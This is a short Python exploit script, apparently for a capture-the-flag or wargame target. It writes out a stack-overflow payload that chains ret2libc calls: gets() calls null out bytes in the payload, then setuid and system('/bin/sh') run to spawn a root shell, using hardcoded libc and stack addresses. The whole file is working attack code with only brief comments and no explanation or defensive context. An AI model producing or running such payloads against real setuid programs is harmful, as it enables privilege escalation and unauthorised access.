#!/usr/bin/env python3

import sys
import struct

pop_ret =  struct.pack("I", 0x080485fb)
gets = struct.pack("I", 0xf7e5afc0)

payload = b'A' * 0x18
payload += b'BBBB'
payload += gets
payload += pop_ret
payload += struct.pack("I", 0xffffd278) # address from exit to nullify

for i in range(4):
    payload += gets
    payload += pop_ret
    payload += struct.pack("I", 0xffffd280 + i) # address of byte to nullify

payload += struct.pack("I", 0xf7eadd60) # setuid
payload += pop_ret
payload += b'CCCC' # will be nullified afterwards
payload += struct.pack("I", 0xf7e36850) # system
payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh

sys.stdout.buffer.write(payload)
